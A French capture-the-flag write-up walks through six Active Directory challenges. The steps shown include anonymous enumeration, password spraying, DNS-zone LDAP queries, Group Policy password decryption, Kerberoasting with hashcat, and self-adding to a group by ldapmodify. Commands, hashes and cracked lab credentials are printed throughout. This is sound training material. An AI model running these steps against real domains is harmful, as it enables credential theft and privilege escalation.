Challenge Realist (AD)
==========================

The LDAP Chronicles 1/6
----------------------------------------------

On fait simplement un enum4linux et on trouve le flag, car aucun compte n'est nécessaire ! 

Commande : enum4linux -U 51.77.110.239

Dans le résultat on voit cette ligne : 
index: 0x10ae RID: 0x466 acb: 0x00000210 Account: sarah_smith   Name: (null)    Desc: 404CTF{Ld4P_4n0nym0us_1s_4_B4d_Pr4ct1c3!}

Flag : **404CTF{Ld4P_4n0nym0us_1s_4_B4d_Pr4ct1c3!}**


Houston, we have a problem 2/6
------------------------------------------------------------

On doit maintenant essayer de trouver quel compte de stagiaire est vulnérable a une password spray attack.

On commence par se connecter avec : rpcclient -U "loup21247_404Player" 51.89.228.14

Puis on liste les utilisateurs avec : enumdomusers 

On obtient les utilisateurs suivants : 

stagiaire01
stagiaire02
stagiaire03
stagiaire04
stagiaire05
stagiaire06
stagiaire07

Il faut maintenant tenter de casser les mots de passe de ces comptes. 

On peut utiliser kerbrute : kerbrute passwordspray -d ctfcorp.local --dc 51.89.228.14 users.txt PASSWORD
Mais test un seul mot de passe à la fois sur tous les utilisateurs

Ou bien crackmapexec : crackmapexec smb 51.89.228.14 -u users.txt -p rockyou.txt
Mais test tout les mots de passe sur le même utilisateur avant de passer au suivants

On a tester best1050 sur les 7 users stagiaires sans succès.

Finalement on a lancé rockyou.txt, on a attendu longtemps mais c'est beaucoup trop long. 

Après avoir demandé au challmaker on se rend compte qu'on a pas trouver toutes les infos utiles ! 

enum4linux -u loup21247_404Player -p '$*!Z2792ekiuro' -a 51.89.228.14 

.. code-block:: console
 
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      Documents publics
        Stagiaires      Disk      Documents des stagiaires
        SYSVOL          Disk      Logon server share 
        
Dans le partage stagiaire on a un fichier trombinoscope.txt qui donne les noms/prénoms et département de chaque stagiaire. 
Et un fichier procedure_stage inaccessible. 

Et dans le partage "Public" on trouve un fichier qui indique que le mot de passe par défaut est "Bienvenue2024!"

On va donc tenter de se connecter au partage Stagiaires, avec les 07 stagiaires et ce mot de passe 

C'est le stagiaire05 qui permet de se connecter avec ce mdp. 

On obtient notre flag : **404CTF{P4ssW0rd_Spr4y_1s_T00_E4sy_F0r_St4g14ir3s}**

Named Resolve 3/6
------------------------------------------------------------

Le troisième, on cherche un réseau caché. 

On a chercher pendant pas mal de temps pour finalement faire : 

ldapsearch -x -H ldap://51.89.228.14  -D "loup21247_404Player@ctfcorp.local" -W -s base namingcontexts 

Ce qui nous donne : 

namingContexts: DC--ctfcorp,DC--local
namingContexts: CN--Configuration,DC--ctfcorp,DC--local
namingContexts: CN--Schema,CN--Configuration,DC--ctfcorp,DC--local
namingContexts: DC--DomainDnsZones,DC--ctfcorp,DC--local
namingContexts: DC--ForestDnsZones,DC--ctfcorp,DC--local

On va a donc chercher tous les objets dans DomainDnsZones : 

.. code-block:: console
    
    ldapsearch -x -H ldap://51.89.230.95 -D "rose252832_404Player@ctfcorp.local" -W -b "dc--DomainDnsZones,dc--ctfcorp,dc--local" "(objectclass--*)"

On trouve un enregistrement "flag" : 

.. code-block:: console

    # flag, challenge.ctfcorp.local, MicrosoftDNS, DomainDnsZones.ctfcorp.local
    dn: DC--flag,DC--challenge.ctfcorp.local,CN--MicrosoftDNS,DC--DomainDnsZones,DC--ct
    fcorp,DC--local
    objectClass: top
    objectClass: dnsNode
    distinguishedName: DC--flag,DC--challenge.ctfcorp.local,CN--MicrosoftDNS,DC--Domai
    nDnsZones,DC--ctfcorp,DC--local
    instanceType: 4
    whenCreated: 20250509200641.0Z
    whenChanged: 20250509200641.0Z
    uSNCreated: 53288
    uSNChanged: 53288
    showInAdvancedViewOnly: TRUE
    name: flag
    objectGUID:: uBYATW+5wUWezB9KD3w3Uw----
    dnsRecord:: OQAQAAXwAAACAAAAAAAOEAAAAAAAAAAAODQwNENURntETlNfWjBuM19XNGxrMW5nX0
    J5cDRzczNzX1RyNG5zZjNyX1Izc3RyMWN0MTBucyF9
    objectCategory: CN--Dns-Node,CN--Schema,CN--Configuration,DC--ctfcorp,DC--local
    dSCorePropagationData: 16010101000000.0Z
    dc: flag

On décode le DnsRecord (base64) et on obtient le flag ! 

Flag : **404CTF{DNS_Z0n3_W4lk1ng_Byp4ss3s_Tr4nsf3r_R3str1ct10ns!}**


The GPO Mission 4/6
------------------------------------------

On commence avec : 

.. code-block:: console
    
    ldapsearch -x -H ldap://51.89.229.210  -D "ours814229_404Player@ctfcorp.local" -W -b "cn--Policies,cn--System,dc--DomainDnsZones,dc--ctfcorp,dc--local" "(objectclass--groupPolicyContainer)"
    ldapsearch -x -H ldap://51.89.229.210  -D "ours814229_404Player@ctfcorp.local" -W -b "CN--{31B2F340-016D-11D2-945F-00C04FB984F9},CN--Policies,CN--System,DC--ctfcorp,DC--local" "(objectClass--*)"

Ensuite on se connecte avec smbclient : smbclient //51.89.229.210/SYSVOL -U "ctfcorp.local\\ours814229_404Player" 

On récupères tout ce qu'on trouve d'intéressant dans le dossier Policies

On trouve notamment : 

.. code-block:: console

    <?xml version--"1.0" encoding--"utf-8"?>
    <Groups clsid--"{3125E937-EB16-4b4c-9934-544FC6D24D26}">
        <Group clsid--"{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name--"Backup Operators" image--"2" changed--"2024-01-15 10:15:00" uid--"{12345678-1234-5678-1234-567890ABCDEF}">
            <Properties action--"U" newName--"" description--"" deleteAllUsers--"0" deleteAllGroups--"0" removeAccounts--"0" groupSid--"S-1-5-32-551">
                <Members>
                    <Member name--"CTFCORP\hidden_admin" action--"ADD" sid--""/>
                    <Member name--"CTFCORP\backup_service" action--"ADD" sid--""/>
                </Members>
            </Properties>
        </Group>
    </Groups>


    <?xml version--"1.0" encoding--"utf-8"?>
    <Drives clsid--"{8FDDCC1A-0C3C-43cd-A6B4-71A6DF20DA8C}">
        <Drive clsid--"{935D1B74-9CB8-4e3c-9914-7DD559B7A417}" name--"Z:" status--"Z:" image--"0" changed--"2024-01-15 08:30:21" uid--"{12345678-90AB-CDEF-1234-567890ABCDEF}">
            <Properties action--"U" thisDrive--"SHOW" allDrives--"SHOW" userName--"CTFCORP\backup_reader" password--"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" path--"\\DC1\Backups" label--"Backups" persistent--"0" useLetter--"1" letter--"Z"/>
        </Drive>
    </Drives>


On va déchiffrer le mot de passe :

gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'

backup_reader:GPPstillStandingStrong2k18

On a maintenant accès a l'utilisateur backup_reader 

On va se connecter avec ce compte sur Backups :  smbclient //51.89.229.210/Backups -U "ctfcorp.local\\backup_reader" 

On obtient un fichier system_backup.txt et le flag : 

Flag : **404CTF{GPP_Pr3f3r3nc3s_4r3_D4ng3r0us!}**


The AD Guardians 5/6
------------------------------------------------

On commence avec 

.. code-block:: console
    
    ldapsearch -x -H ldap://51.89.230.137  -D "rose716851_404Player@ctfcorp.local" -W -b "dc--ctfcorp,dc--local" "(objectclass--*)"

Ici on a un compte sql_services avec un snp valide ! 

.. code-block:: console

    # sql_service, Users, ctfcorp.local
    dn: CN--sql_service,CN--Users,DC--ctfcorp,DC--local
    objectClass: top
    objectClass: person
    objectClass: organizationalPerson
    objectClass: user
    cn: sql_service
    description: SQL Server Service Account
    distinguishedName: CN--sql_service,CN--Users,DC--ctfcorp,DC--local
    instanceType: 4
    whenCreated: 20250505163318.0Z
    whenChanged: 20250510213724.0Z
    uSNCreated: 54581
    memberOf: CN--CTF_Player,CN--Users,DC--ctfcorp,DC--local
    uSNChanged: 233930
    name: sql_service
    objectGUID:: +BvWnS9ShECZOKC//54xHQ----
    userAccountControl: 66048
    badPwdCount: 0
    codePage: 0
    countryCode: 0
    badPasswordTime: 133920549769958092
    lastLogoff: 0
    lastLogon: 133920626011637279
    pwdLastSet: 133909363982156734
    primaryGroupID: 513
    objectSid:: AQUAAAAAAAUVAAAA0K+mO17I1hccU3fzZQQAAA----
    accountExpires: 9223372036854775807
    logonCount: 10
    sAMAccountName: sql_service
    sAMAccountType: 805306368
    userPrincipalName: sql_service@ctfcorp.local
    servicePrincipalName: MSSQLSvc/dc1.ctfcorp.local:1433
    objectCategory: CN--Person,CN--Schema,CN--Configuration,DC--ctfcorp,DC--local
    dSCorePropagationData: 16010101000000.0Z
    lastLogonTimestamp: 133913866441481848

On va demander un ticket pour ce compte : impacket-GetUserSPNs ctfcorp.local/rose716851_404Player:'%&&Szvyttf7541' -dc-ip 51.89.230.137 -request

Le hash : 

.. code-block:: console
    
    $krb5tgs$23$*sql_service$CTFCORP.LOCAL$ctfcorp.local/sql_service*$e388abeee5be47837540cec97f47f5b3$40abfa5cab1916e3cc02244bfe911c7f60aa1ce4d77a609bde79c31db9816fec7811f10e414bb1d8ebfcff785833a97d04f8535fa3758d602f5653671aa1294fbdf218d5992d5199100590cb7fa81e5e7508361492cc186d0df40d601ba9f91bc43852fffc972a26fa6f22d9bb151aa9a37ff909405900ffb75aa652c0af1d36eaa0df3bfb7f1defa6b2a94c95255090f598bc0c09e8ab7dc17ba6b3174ccd61e285ec693b5eb8ec98594a87392a677767fb8963db9911742d42e8756cfb391cdd9e89e03b8d37cbcb85a00e33f25ac22bb0211ae521c5443d38d2aa13db07ad024887cf6e133e3553e75b57831b48d9118abea09871a8c004b89d94459580424510d9fcad1433ce67f32d52c0edcd4b601d2d0669f3cdc32800420ae8757be8dba1db79e985a053e1a647d1ebf920b9474f107e27410f32dc091526fe2e3c6a9ac88860e062a7887315579b8cc9b77cba0e208ad1dfba9b12ef571a025e6d6e172650028614462b89fbdd28e2298f522608cffd780b019dbd0b8e0a297a3989deb93a548b06fb219bb8f626a797a3611be1c730e5550b8d3cc089538f348c5e3827b76bcee9e2c573c54534f3d2f55e19410ed17ca732b44de295b8701ea7b6ed51789a5907757e21329c8aa1a49724433c6a5b1019e2aec97843e1f5f62534716a6bd44e0741c100b258083f19dab15f0976145fa4a5ea86927808b9fa2aec9fdb992940e5e2b514f9308f974ab85788031901e601672c43504d2a668e4c4bb99ecac183b04fc4f91d92ab139d8de991883cb29a5b3d458af978cacaa3ff2f73d983dbcaf102cbee80b890d54cffa2d2b1ad6429269ad782d7807f0f78bfa4fe6a4b9eed8ef45898a2cbe4328a4ef8ca69d1f0b1a1ad4c00ff4f51a8c266fa9658ccc9b3dbdbb3dd866d62d1d7c59f6f9ca4cf30313da6e47ef82ef331f0fc9353f7ccc0483c05c37048b74faa1cfb73728c3cb1316ed5bb1b0e7c1182b141b7c348d4481894b72f3ae45b2bedfe5f3d2e8186c2c0873df316a36746ce8d4fbdd7835a40fda7bbb2fb79fa2db5777bd5cb90d43c6848ddc0efcf2f3fc209a0189a4c533eda6870b2f5a47f91fde420228c4f1451083d8679ba470b74ab6efdde10b693474d1f67c33418e039922f6ebf87a394d293bf794dea6a8c1b7851844c6f478a88e1234ae53ca22b033be17017b900023baaf577beb174ea625882d96a4bc9b3b31cb7c1278db94db12b35c37d5204464322d1d70e04f395eda75d2f192933dff9de7eed8d1597cc99aac92be87c591138390a747cd5c2b4d44c8779e1cad4a4fd4aea0d9d19ea14999f9598b1c257cd395e7607313cc1cb3fe5c9660c793df8363e833fe868a304d220a749678e93a6f9ef1d82fab78291781efd2e4f1ec24ffddcdc7b54ed7269e40a66e3d581047660630e766b346a59ce811d1eb616d745af5072604fa1eaa4d3cba2173d6566f8dfded68b15b9ef030dbd9f9b8f90259df1ffad8f9472b65bd2ee80412d22315c5c3f7a110469d2daaae117ed815394aa45cdb5dd7c502b4386c758254f3042732794115f159db3da0fcf2c5d6ef74579124d1e8a19762bbc1da9e53f1cabccb4a4e9a9621bd1065939de25c8c04786f582ea6883fcf83272acc2eb9510bfc61a8c7a4c951a9a6843b5f9005c189148c8dbf2ec8f36e3544072fac7cf17fd35cb07b8b6121f5b

On va faire un hascat pour le craqué avec rockyou : hashcat -m 13100 hash.txt ../weakhack-sphinx/doc/_static/files_to_download/wordlists/rockyou_aa

On obtient : fantastic

.. code-block:: console
    
    ldapsearch -x -H ldap://51.89.230.137  -D "sql_service@ctfcorp.local" -W -b "dc--ctfcorp,dc--local" "(objectclass--*)" | grep hidden -B 20 -A 20

On obtient notre flag : **404CTF{K3rb3r04st1ng_1s_Th3_W4y}**

Ghost Membership 6/6
--------------------------------------------

On commence comme d'habitude : 

enum4linux -u mer760914_404Player -p 'lkhksr9077@&@P' -a 51.89.230.87

On a un partage flagshare 

On va s'y connecter : smbclient //51.89.230.87/flagshare -U "ctfcorp.local\\mer760914_404Player"

On voit qu'il y a un groupe CTF_FLAG, surement ce groupe qui peut lire le flag, il va essayer de rejoindre le groupe. 

Merci GPT

On va créer un fichier mod.ldif : 

dn: CN--CTF_Flag,CN--Users,DC--ctfcorp,DC--local
changetype: modify
add: member
member: cn--mer760914_404Player,cn--Users,dc--ctfcorp,dc--local

Qui nous ajoute en tant que membre à CTF_Flag,

Puis on utilise ldapmodify : ldapmodify -x -D "mer760914_404Player@ctfcorp.local" -w 'lkhksr9077@&@P' -H ldap://51.89.230.87-f mod.ldif

On se reconnecte au smb, et on prend récupère le fichier flag.txt : **404CTF{Wr1t3_M3mb3r5_1s_D4ng3r0us_R1ght!}**